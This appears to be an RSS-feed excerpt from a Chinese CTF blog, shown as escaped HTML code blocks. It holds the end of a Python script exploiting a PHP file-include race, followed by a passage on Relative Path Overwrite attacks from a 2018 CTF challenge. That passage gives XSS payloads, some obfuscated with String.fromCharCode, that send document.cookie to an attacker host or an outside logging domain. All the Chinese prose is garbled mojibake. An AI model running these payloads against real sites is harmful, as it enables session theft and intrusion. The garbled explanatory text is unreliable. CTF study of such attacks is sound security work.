&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">response&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">files&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">files&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">response&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">except&lt;/span> &lt;span style="color:#75af00">Exception&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#75af00">e&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">e&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">def&lt;/span> &lt;span style="color:#75af00">generate_tmp_files&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">with&lt;/span> &lt;span style="color:#75af00">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;miao.png&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;rb&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#75af00">fin&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">file_content&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fin&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">phpinfo_url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;%s/e2a7106f1cc8bb1e1318df70aa0a3540.php?72aa377b-3fc0-4599-8194-3afe2fc9054b=php://filter/string.strip_tags/resource=passwd&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">base_url&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">length&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">times&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">charset&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">**&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">length&lt;/span> &lt;span style="color:#f92672">/&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#75af00">in&lt;/span> &lt;span style="color:#75af00">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">times&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[+] %d / %d&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">times&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">upload_file_to_include&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">phpinfo_url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">file_content&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">def&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">generate_tmp_files&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>åå¼¹shellï¼Œsuidææƒåç¿»æ‰¾flag&lt;/p></description></item><item><title>RPOæ”»å‡»å­¦ä¹ ç¬”è®°</title><link>https://amiaaaz.github.io/2022/04/24/rpo-attack-study-notes/</link><pubDate>Sun, 24 Apr 2022 21:39:29 +0800</pubDate><guid>https://amiaaaz.github.io/2022/04/24/rpo-attack-study-notes/</guid><description>&lt;p>&lt;a href="http://0n0.fun/post/2018/03/learn-about-rpo-from-one-ctf-challenge/">http://0n0.fun/post/2018/03/learn-about-rpo-from-one-ctf-challenge/&lt;/a>&lt;/p>
&lt;hr>
&lt;p>RPOæŒ‡Relative Path Overwrite ç›¸å¯¹è·¯å¾„è¦†ç›–ï¼Œåˆ©ç”¨æµè§ˆå™¨å’ŒæœåŠ¡å™¨çš„è§£æå·®å¼‚ å°†é¡µé¢ä¸­ä½¿ç”¨ç›¸å¯¹è·¯å¾„å¼•å…¥çš„é™æ€èµ„æºæ–‡ä»¶è¿›è¡Œæ›¿æ¢ï¼Œå®ŒæˆRPOæ”»å‡»&lt;/p>
&lt;p>æœ€å¸¸è§çš„å°±æ˜¯å¯¹url pathçš„è§£æå·®å¼‚ï¼Œæ¯”å¦‚è¿™æ ·çš„url&lt;/p>
&lt;pre tabindex="0">&lt;code>http://192.168.31.175/test%2findex.html
&lt;/code>&lt;/pre>&lt;p>é»˜è®¤æƒ…å†µä¸‹apacheä¼šè®¤ä¸ºè¯·æ±‚çš„æ˜¯&lt;code>test%2findex.html&lt;/code>ï¼Œæ— æ³•è®¿é—®ï¼Œè€ŒNginxä¼šå°†&lt;code>%2f&lt;/code>è§£æä¸º&lt;code>/&lt;/code> ä»è€Œè®¤ä¸ºè¯·æ±‚çš„æ˜¯testæ–‡ä»¶å¤¹ä¸‹çš„&lt;code>index.html&lt;/code>ï¼Œæ­£å¸¸è®¿é—®ï¼ˆå¯ä»¥é€šè¿‡ä¿®æ”¹è·¯ç”±è§„åˆ™æ¥å½±å“è¿™äº›ï¼‰&lt;/p>
&lt;p>å¦ä¸€ä¸ªéœ€è¦æ»¡è¶³çš„æ¡ä»¶æ˜¯é¡µé¢é™æ€èµ„æºæ–‡ä»¶çš„ç›¸å¯¹è·¯å¾„ï¼Œä»¥ä¸‹é¢çš„é¢˜ä¸ºä¾‹&lt;/p>
&lt;h2 id="å¼ºç½‘æ¯-2018share-mind">[å¼ºç½‘æ¯ 2018]share mind&lt;/h2>
&lt;p>*æ²¡æœ‰æ‰¾åˆ°dockeræ–‡ä»¶ï¼Œä»¥ä¸‹å†…å®¹å‚è€ƒ&lt;a href="https://yangrz.github.io/blog/2018/03/27/ctf/">wp1&lt;/a> | &lt;a href="https://xz.aliyun.com/t/2220">wp2&lt;/a>&lt;/p>
&lt;p>æˆ‘ä»¬å¯ä»¥åœ¨reporté¡µé¢ç»™botæäº¤ä¸€ä¸ªlinkï¼Œè¿˜å¯ä»¥å†™noteï¼Œå¦‚æœä¸å†™æ ‡é¢˜åªå†™å†…å®¹çš„è¯åœ¨viewæ—¶æ–‡ç« é¡µé¢æ˜¯ç›´æ¥æ‰“å°çš„å†…å®¹ï¼ˆæ— &lt;code>&amp;lt;h1&amp;gt;&lt;/code>ï¼‰ï¼Œè€Œä¸¤ä¸ªéƒ½å†™äº†çš„è¯æ˜¯æŠŠæ–‡ç« æ ‡é¢˜å’Œå†…å®¹éƒ½è¾“å‡ºåœ¨htmlæ ‡ç­¾ä¹‹é—´çš„ï¼ˆæœ‰&lt;code>&amp;lt;h1&amp;gt;&lt;/code>ï¼‰&lt;/p>
&lt;p>&lt;img src="https://github.com/yangrz/blog/raw/gh-pages/img/share%20your%20mind6.png" alt="share your mind6">&lt;/p>
&lt;p>&lt;img src="https://github.com/yangrz/blog/raw/gh-pages/img/share%20your%20mind7.png" alt="share your mind7">&lt;/p>
&lt;p>åœ¨é¡µé¢æºç ä¸­æˆ‘ä»¬å¯ä»¥å‘ç°jquery.min.jsè¿™ä¸ªæ–‡ä»¶æ˜¯ä½¿ç”¨çš„ç›¸å¯¹è·¯å¾„çš„æ–¹å¼å¼•å…¥åˆ°index.phpé¡µé¢&lt;/p>
&lt;p>&lt;img src="https://github.com/yangrz/blog/raw/gh-pages/img/share%20your%20mind8.png" alt="share your mind8">&lt;/p>
&lt;p>ä¹Ÿå°±æ˜¯è¯´å¦‚æœè®¿é—®çš„é¡µé¢æ˜¯&lt;code>http://39.107.33.96:20000/index.php/&lt;/code>åˆ™ä¼šå¼•å…¥&lt;code>http://39.107.33.96:20000/index.php/static/js/jquery.min.js&lt;/code>ï¼Œç»“åˆæˆ‘ä»¬å‰é¢æè¿‡çš„urlè§£æé—®é¢˜ï¼Œå¦‚æœè®¿é—®çš„é¡µé¢æ˜¯&lt;code>http://39.107.33.96:20000/index.php/view/article/1494/..%2f..%2f..%2f..%2f&lt;/code> æµè§ˆå™¨åˆ™ä¼šå°è¯•å¼•å…¥&lt;code>http://39.107.33.96:20000/index.php/view/article/1494/..%2f..%2f..%2f..%2fstatic/js/jquery.min.js&lt;/code>ï¼Œè€Œè¿™ä¸ªurlè¯·æ±‚çš„é¡µé¢å®é™…ä¸Šè¿˜æ˜¯æˆ‘ä»¬çš„Noteï¼Œä¹Ÿå°±æ˜¯noteå†…å®¹å°†ä½œä¸ºjquery.min.jsè¢«å¼•å…¥é¡µé¢ï¼Œå¦‚æœnoteéƒ¨åˆ†æ˜¯payloadï¼Œé‚£ä¹ˆè®¿é—®&lt;code>http://39.107.33.96:20000/index.php/view/article/1494/..%2f..%2f..%2f..%2f&lt;/code>å°±ä¼šæ‰§è¡Œ&lt;/p>
&lt;p>æˆ‘ä»¬å¯ä»¥æ„é€ ç±»ä¼¼è¿™æ ·çš„payloadæ¥å·cookie&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Image&lt;/span>&lt;span style="color:#111">()).&lt;/span>&lt;span style="color:#75af00">src&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://vps-ip:port/?cookie=&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">cookie&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>é¡µé¢å¯¹å¼•å·åšäº†è½¬ä¹‰ï¼Œæˆ‘ä»¬ç”¨&lt;code>String.fromCharCode&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Image&lt;/span>&lt;span style="color:#111">()).&lt;/span>&lt;span style="color:#75af00">src&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">fromCharCode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">104&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">116&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">116&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">112&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">58&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">47&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">47&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">55&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">101&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">52&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">122&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">119&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">48&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">99&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">101&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">121&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">101&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">46&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">105&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">111&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">63&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">cookie&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>cookieæç¤ºæˆ‘ä»¬æ‰“å¦ä¸€ä¸ªç›®å½•ï¼Œæ„é€ exp&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">iframe&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">createElement&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">fromCharCode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">105&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">102&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">114&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">97&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">109&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">101&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">iframe&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">src&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">fromCharCode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">47&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">81&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">87&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">66&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">95&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">102&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">108&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">52&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">103&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">47&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">81&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">87&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">66&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">47&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">iframe&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">fromCharCode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">102&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">114&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">97&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">109&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">101&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">appendChild&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">iframe&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">iframe&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">getElementById&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">fromCharCode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">102&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">114&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">97&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">109&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">101&lt;/span>&lt;span style="color:#111">)).&lt;/span>&lt;span style="color:#75af00">contentWindow&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">cookie&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">y1r0nz&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">createElement&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">fromCharCode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">108&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">105&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">110&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">107&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">y1r0nz&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setAttribute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">fromCharCode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">114&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">101&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">108&lt;/span>&lt;span style="color:#111">),&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">fromCharCode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">112&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">114&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">101&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">102&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">101&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">116&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">99&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">104&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">y1r0nz&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setAttribute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">fromCharCode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">104&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">114&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">101&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">102&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">fromCharCode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">47&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">47&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">55&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">101&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">52&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">122&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">119&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">48&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">46&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">99&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">101&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">121&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">101&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">46&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">105&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">111&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">47&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">63&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">102&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">108&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">97&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">103&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">61&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">c&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">head&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">appendChild&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">y1r0nz&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç»è¿‡æµè§ˆå™¨æ¸²æŸ“ä»¥åå°±æ˜¯ä¸‹è¿°çš„ä¸¤è¡Œhtmlä»£ç &lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">iframe&lt;/span> &lt;span style="color:#75af00">id&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;frame&amp;#34;&lt;/span> &lt;span style="color:#75af00">src&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;/QWB_fl4g/QWB/&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
